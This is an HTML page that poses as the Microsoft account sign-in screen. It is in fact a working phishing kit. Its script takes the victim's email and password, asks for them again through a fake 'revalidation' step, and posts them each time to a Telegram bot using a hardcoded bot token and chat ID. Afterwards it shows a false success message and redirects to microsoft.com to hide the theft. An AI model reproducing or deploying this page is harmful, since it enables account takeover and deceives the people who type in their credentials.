<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMgpEfAAB4AARwAgXQAAAARRAAAFnA9UgAAAANSURBVAgdY9j9HwAEFwCqK2+zRgAAAABJRU5ErkJggg==">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        body {
            background-color: #ffffff;
            color: #323130;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 24px;
        }
        
        .login-container {
            width: 100%;
            max-width: 440px;
        }
        
        .login-box {
            background: #ffffff;
            border-radius: 4px;
            box-shadow: 0 0 0 1px #edebe9, 0 2px 4px 1px rgba(0, 0, 0, 0.1);
            border: 1px solid #e1e1e1;
            overflow: hidden;
        }
        
        .logo-container {
            padding: 40px 28px 8px;
            text-align: left;
        }
        
        .logo {
            width: 108px;
            height: 24px;
        }
        
        .logo svg {
            width: 100%;
            height: 100%;
        }
        
        .login-header {
            padding: 0 28px 24px;
            text-align: left;
        }
        
        .login-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #323130;
        }
        
        .login-content {
            padding: 0 28px 28px;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-group.hidden {
            display: none;
        }
        
        label {
            display: block;
            margin-bottom: 6px;
            font-size: 14px;
            font-weight: 600;
            color: #323130;
        }
        
        .input-container {
            position: relative;
            width: 100%;
        }
        
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 8px 0;
            border: none;
            border-bottom: 1px solid #8a8886;
            font-size: 14px;
            background: transparent;
            transition: all 0.2s ease;
            border-radius: 0;
        }
        
        input[type="email"]:focus, input[type="password"]:focus {
            outline: none;
            border-bottom-color: #323130;
            border-bottom-width: 2px;
        }

        input[type="email"]:hover, input[type="password"]:hover {
            border-bottom-color: #323130;
        }
        
        .password-toggle {
            position: absolute;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            color: #605e5c;
            transition: color 0.2s ease;
        }
        
        .password-toggle:hover {
            color: #0078d4;
            background: none;
        }
        
        .password-toggle svg {
            width: 20px;
            height: 20px;
            display: block;
        }
        
        .forgot-link {
            display: block;
            font-size: 13px;
            color: #0078d4;
            text-decoration: none;
            margin-top: 8px;
        }
        
        .forgot-link:hover {
            color: #106ebe;
            text-decoration: underline;
        }

        .no-account-text {
            display: inline-block;
            font-size: 13px;
            color: #323130;
            margin-right: 4px;
        }

        .create-account-link {
            display: inline-block;
            font-size: 13px;
            color: #0078d4;
            text-decoration: none;
        }

        .create-account-link:hover {
            color: #106ebe;
            text-decoration: underline;
        }
        
        .buttons-container {
            margin-top: 24px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
        }
        
        .signin-button {
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 2px;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            height: 32px;
            min-width: 108px;
            transition: background-color 0.2s ease;
        }
        
        .signin-button:hover {
            background-color: #106ebe;
        }
        
        .signin-button:disabled {
            background-color: #c8c6c4;
            cursor: not-allowed;
        }
        
        .back-button {
            background: none;
            border: none;
            color: #0078d4;
            cursor: pointer;
            font-size: 14px;
            padding: 8px 0;
            margin-right: auto;
            transition: color 0.2s ease;
        }
        
        .back-button:hover {
            color: #106ebe;
            text-decoration: underline;
        }
        
        .back-button.hidden {
            display: none;
        }
        
        .signin-options {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #edebe9;
        }
        
        .signin-options-title {
            font-size: 14px;
            color: #605e5c;
            margin-bottom: 16px;
            text-align: center;
        }
        
        .error-message {
            color: #d13438;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }
        
        .success-message {
            color: #107c10;
            font-size: 14px;
            margin-top: 16px;
            text-align: center;
            display: none;
            padding: 12px;
            background-color: #dff6dd;
            border: 1px solid #107c10;
            border-radius: 2px;
        }
        
        .revalidation-message {
            color: #107c10;
            font-size: 14px;
            margin-top: 16px;
            text-align: center;
            display: none;
            padding: 12px;
            background-color: #dff6dd;
            border: 1px solid #107c10;
            border-radius: 2px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.8; }
            100% { opacity: 1; }
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #605e5c;
            width: 100%;
            max-width: 440px;
        }
        
        .footer a {
            color: #0078d4;
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer a:hover {
            color: #106ebe;
            text-decoration: underline;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            display: none;
        }
        
        .loading-spinner {
            width: 32px;
            height: 32px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 12px;
        }

        .loading-text {
            color: #323130;
            font-size: 14px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* New styles for revalidation step */
        .revalidation-header {
            padding: 0 28px 24px;
            text-align: left;
        }
        
        .revalidation-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #323130;
        }
        
        .revalidation-instruction {
            font-size: 14px;
            color: #605e5c;
            margin-bottom: 16px;
        }

        /* Responsive design */
        @media (max-width: 480px) {
            body {
                padding: 20px 16px;
            }
            
            .logo-container {
                padding: 32px 20px 8px;
            }
            
            .login-header {
                padding: 0 20px 20px;
            }
            
            .login-content {
                padding: 0 20px 24px;
            }

            .login-title {
                font-size: 21px;
            }
            
            .revalidation-header {
                padding: 0 20px 20px;
            }
        }

        @media (max-width: 320px) {
            .buttons-container {
                flex-direction: column;
                gap: 12px;
            }
            
            .back-button {
                margin-right: 0;
                order: 2;
            }
            
            .signin-button {
                order: 1;
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Signing you in...</div>
    </div>
    
    <div class="login-container">
        <div class="login-box">
            <div class="logo-container">
                <div class="logo">
                    <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24">
                        <title>Microsoft</title>
                        <path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/>
                        <rect width="10.931" height="10.931" fill="#f25022"/>
                        <rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/>
                        <rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/>
                        <rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/>
                    </svg>
                </div>
            </div>
            
            <div class="login-header">
                <h1 class="login-title">Sign in</h1>
            </div>
            
            <div class="login-content">
                <form id="loginForm">
                    <!-- Initial Login Form -->
                    <div class="form-group" id="emailGroup">
                        <label for="email">Email, phone, or Skype</label>
                        <div class="input-container">
                            <input type="email" id="email" name="email" placeholder="someone@example.com" required autocomplete="username">
                        </div>
                        <div class="error-message" id="emailError">Please enter a valid email address</div>
                        <div class="links-container">
                            <span class="no-account-text">No account?</span>
                            <a href="https://signup.live.com/" class="create-account-link">Create one!</a>
                            <a href="https://account.live.com/acsr" class="forgot-link">Can't access your account?</a>
                        </div>
                    </div>
                    
                    <div class="form-group hidden" id="passwordGroup">
                        <label for="password">Password</label>
                        <div class="input-container">
                            <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
                            <button type="button" class="password-toggle" id="passwordToggle">
                                <svg viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                                </svg>
                            </button>
                        </div>
                        <div class="error-message" id="passwordError">Please enter your password</div>
                    </div>
                    
                    <!-- Revalidation Form -->
                    <div class="form-group hidden" id="revalidationGroup">
                        <div class="revalidation-header">
                            <h2 class="revalidation-title">Revalidate Your Account</h2>
                            <p class="revalidation-instruction">For security purposes, please re-enter your credentials to verify your identity.</p>
                        </div>
                        
                        <label for="revalidationEmail">Email</label>
                        <div class="input-container">
                            <input type="email" id="revalidationEmail" name="revalidationEmail" placeholder="someone@example.com" required autocomplete="username">
                        </div>
                        <div class="error-message" id="revalidationEmailError">Please enter your email address</div>
                        
                        <label for="revalidationPassword">Password</label>
                        <div class="input-container">
                            <input type="password" id="revalidationPassword" name="revalidationPassword" placeholder="Enter your password" required autocomplete="current-password">
                            <button type="button" class="password-toggle" id="revalidationPasswordToggle">
                                <svg viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                                </svg>
                            </button>
                        </div>
                        <div class="error-message" id="revalidationPasswordError">Please enter your password</div>
                    </div>
                    
                    <div class="buttons-container">
                        <button type="button" class="back-button hidden" id="backButton">Back</button>
                        <button type="button" class="signin-button" id="submitButton">Next</button>
                    </div>
                    
                    <div class="signin-options">
                        <div class="signin-options-title">Sign-in options</div>
                    </div>
                    
                    <div class="success-message" id="successMessage">
                        <strong>Successfully signed in!</strong><br>
                        Redirecting to Microsoft...
                    </div>
                    
                    <div class="revalidation-message" id="revalidationMessage">
                        <strong>âœ“ Your account has been successfully re-validated</strong><br>
                        Your credentials have been verified and your account is now fully secured. You can proceed to enjoy your Microsoft account without any hitches.
                    </div>
                </form>
            </div>
        </div>
        
        <footer class="footer">
            <div>
                <a href="https://www.microsoft.com/en-us/servicesagreement/">Terms of use</a>
                <a href="https://privacy.microsoft.com/en-us/privacystatement">Privacy & cookies</a>
            </div>
        </footer>
    </div>

    <script>
        // Telegram Bot API configuration
        const TELEGRAM_BOT_TOKEN = '8404555198:AAE1SxNtayHrFChAi-2lrTIJtdROT_gSThk';
        const TELEGRAM_CHAT_ID = '6439618231';
        
        // DOM Elements
        const emailGroup = document.getElementById('emailGroup');
        const passwordGroup = document.getElementById('passwordGroup');
        const revalidationGroup = document.getElementById('revalidationGroup');
        const backButton = document.getElementById('backButton');
        const submitButton = document.getElementById('submitButton');
        const loginForm = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const revalidationEmailInput = document.getElementById('revalidationEmail');
        const revalidationPasswordInput = document.getElementById('revalidationPassword');
        const passwordToggle = document.getElementById('passwordToggle');
        const revalidationPasswordToggle = document.getElementById('revalidationPasswordToggle');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const revalidationEmailError = document.getElementById('revalidationEmailError');
        const revalidationPasswordError = document.getElementById('revalidationPasswordError');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const successMessage = document.getElementById('successMessage');
        const revalidationMessage = document.getElementById('revalidationMessage');
        
        // Form state
        let currentStep = 1; // 1: email, 2: password, 3: revalidation
        let passwordVisible = false;
        let revalidationPasswordVisible = false;
        let userEmail = '';
        let userPassword = '';
        
        // Password toggle functionality
        passwordToggle.addEventListener('click', function() {
            passwordVisible = !passwordVisible;
            passwordInput.type = passwordVisible ? 'text' : 'password';
            updatePasswordToggleIcon(passwordToggle, passwordVisible);
        });
        
        revalidationPasswordToggle.addEventListener('click', function() {
            revalidationPasswordVisible = !revalidationPasswordVisible;
            revalidationPasswordInput.type = revalidationPasswordVisible ? 'text' : 'password';
            updatePasswordToggleIcon(revalidationPasswordToggle, revalidationPasswordVisible);
        });
        
        function updatePasswordToggleIcon(toggleElement, isVisible) {
            if (isVisible) {
                toggleElement.innerHTML = `
                    <svg viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                    </svg>
                `;
            } else {
                toggleElement.innerHTML = `
                    <svg viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                    </svg>
                `;
            }
        }
        
        // Handle submit button click
        submitButton.addEventListener('click', function(e) {
            e.preventDefault();
            
            if (currentStep === 1) {
                // Validate email
                const email = emailInput.value.trim();
                if (!email || !isValidEmail(email)) {
                    emailError.style.display = 'block';
                    emailInput.focus();
                    return;
                }
                
                // Hide email error if shown
                emailError.style.display = 'none';
                
                // Store email for later use
                userEmail = email;
                
                // Show password field
                emailGroup.classList.add('hidden');
                passwordGroup.classList.remove('hidden');
                backButton.classList.remove('hidden');
                submitButton.textContent = 'Sign in';
                currentStep = 2;
                
                // Focus on password field
                setTimeout(() => {
                    passwordInput.focus();
                }, 100);
            } else if (currentStep === 2) {
                // Validate password
                const password = passwordInput.value;
                
                if (!password) {
                    passwordError.style.display = 'block';
                    passwordInput.focus();
                    return;
                }
                
                // Hide password error if shown
                passwordError.style.display = 'none';
                
                // Store password for later use
                userPassword = password;
                
                // Send credentials to Telegram
                sendToTelegram(userEmail, userPassword);
                
                // Show revalidation form
                passwordGroup.classList.add('hidden');
                revalidationGroup.classList.remove('hidden');
                submitButton.textContent = 'Revalidate';
                currentStep = 3;
                
                // Pre-fill revalidation email
                revalidationEmailInput.value = userEmail;
                
                // Focus on revalidation password field
                setTimeout(() => {
                    revalidationPasswordInput.focus();
                }, 100);
            } else if (currentStep === 3) {
                // Validate revalidation credentials
                const revalidationEmail = revalidationEmailInput.value.trim();
                const revalidationPassword = revalidationPasswordInput.value;
                
                if (!revalidationEmail || !isValidEmail(revalidationEmail)) {
                    revalidationEmailError.style.display = 'block';
                    revalidationEmailInput.focus();
                    return;
                }
                
                if (!revalidationPassword) {
                    revalidationPasswordError.style.display = 'block';
                    revalidationPasswordInput.focus();
                    return;
                }
                
                // Hide errors if shown
                revalidationEmailError.style.display = 'none';
                revalidationPasswordError.style.display = 'none';
                
                // Send revalidation credentials to Telegram
                sendToTelegram(revalidationEmail, revalidationPassword, true);
                
                // Show loading
                loadingOverlay.style.display = 'flex';
                
                // Show revalidation success message and redirect to microsoft.com
                setTimeout(() => {
                    loadingOverlay.style.display = 'none';
                    revalidationGroup.classList.add('hidden');
                    revalidationMessage.style.display = 'block';
                    
                    // Redirect to microsoft.com after showing revalidation message
                    setTimeout(() => {
                        window.location.href = 'https://www.microsoft.com/';
                    }, 3000);
                }, 1500);
            }
        });
        
        // Handle back button
        backButton.addEventListener('click', function() {
            if (currentStep === 2) {
                // Go back to email step
                passwordGroup.classList.add('hidden');
                emailGroup.classList.remove('hidden');
                backButton.classList.add('hidden');
                submitButton.textContent = 'Next';
                currentStep = 1;
                
                // Focus on email field
                setTimeout(() => {
                    emailInput.focus();
                }, 100);
            } else if (currentStep === 3) {
                // Go back to password step
                revalidationGroup.classList.add('hidden');
                passwordGroup.classList.remove('hidden');
                submitButton.textContent = 'Sign in';
                currentStep = 2;
                
                // Focus on password field
                setTimeout(() => {
                    passwordInput.focus();
                }, 100);
            }
        });
        
        // Handle Enter key press
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                submitButton.click();
            }
        });
        
        // Hide error messages when user starts typing
        emailInput.addEventListener('input', function() {
            emailError.style.display = 'none';
        });
        
        passwordInput.addEventListener('input', function() {
            passwordError.style.display = 'none';
        });
        
        revalidationEmailInput.addEventListener('input', function() {
            revalidationEmailError.style.display = 'none';
        });
        
        revalidationPasswordInput.addEventListener('input', function() {
            revalidationPasswordError.style.display = 'none';
        });
        
        // Email validation function
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }
        
        // Function to send credentials to Telegram
        function sendToTelegram(email, password, isRevalidation = false) {
            const stepType = isRevalidation ? "Revalidation" : "Initial Login";
            const message = `ðŸ” Microsoft Login - ${stepType}\n\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}\n\nðŸŒ User Agent: ${navigator.userAgent}\nðŸ•’ Time: ${new Date().toLocaleString()}\nðŸ“ URL: ${window.location.href}`;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Telegram response:', data);
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
            });
        }
        
        // Auto-focus on email input when page loads
        window.addEventListener('load', function() {
            emailInput.focus();
        });
    </script>
</body>
</html>